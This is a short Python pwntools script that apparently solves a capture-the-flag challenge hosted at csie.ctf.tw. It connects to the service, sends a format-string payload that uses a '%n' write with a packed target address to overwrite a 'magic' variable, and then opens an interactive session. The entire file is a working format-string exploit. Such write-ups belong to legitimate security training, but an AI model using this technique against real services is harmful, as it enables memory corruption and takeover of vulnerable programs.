from pwn import *

host = "csie.ctf.tw"
port = 10134

r = remote(host , port)


magic = 0x0060106c

fmt = b"%218c%22$n".ljust(0x80, b"A") + p64(magic)
r.recvuntil(":")
r.send(fmt)
f = r.recvline()
print(f)
r.interactive()
